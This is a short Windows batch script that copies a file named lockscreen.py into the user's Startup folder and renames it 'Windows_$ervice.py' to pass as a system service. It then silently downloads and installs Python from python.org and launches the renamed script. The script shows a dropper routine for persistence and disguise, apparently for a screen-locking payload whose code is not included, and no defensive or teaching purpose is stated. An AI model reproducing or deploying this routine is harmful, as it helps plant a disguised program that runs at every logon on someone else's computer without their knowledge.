@echo off
copy "lockscreen.py" "C:\Users\Admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
cd C:\Users\Admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
rename lockscreen.py Windows_$ervice.py

REM Download Python installer (replace the URL with the desired version)
curl -o python-installer.exe https://www.python.org/ftp/python/3.10.9/python-3.10.9-amd64.exe > nul 

REM Install Python silently
python-installer.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
start Windows_$ervice.py
